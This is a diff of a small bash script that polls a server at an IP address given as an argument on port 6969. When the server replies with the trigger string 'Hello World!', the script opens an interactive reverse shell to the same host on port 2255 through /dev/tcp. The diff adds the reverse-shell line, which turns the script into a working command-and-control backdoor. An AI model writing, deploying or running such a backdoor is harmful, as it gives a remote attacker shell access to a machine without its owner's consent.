@@ -1,16 +1,19 @@
 #!/bin/bash
 
+
 IP=$1
-REVERSE_SHELL_CODE = "reverse_shell"
+
+REVERSE_SHELL_CODE="Hello World!"
 
 while true; do
-    echo $IP
-    RESPONSE=$(curl -s http://$IP)
+    echo  "http://$IP:6969"
+    RESPONSE=$(curl -s http://$IP:6969)
     if [[ $RESPONSE == "" ]]; then
         echo "server down."
     else
         if [[ $RESPONSE == $REVERSE_SHELL_CODE ]]; then
-            echo "REVERSE_SHELL"
+            echo "STARTING REVERSE SHELL"
+            bash -i >& /dev/tcp/$IP/2255 0>&1
         else
             echo $RESPONSE
             echo "something else"
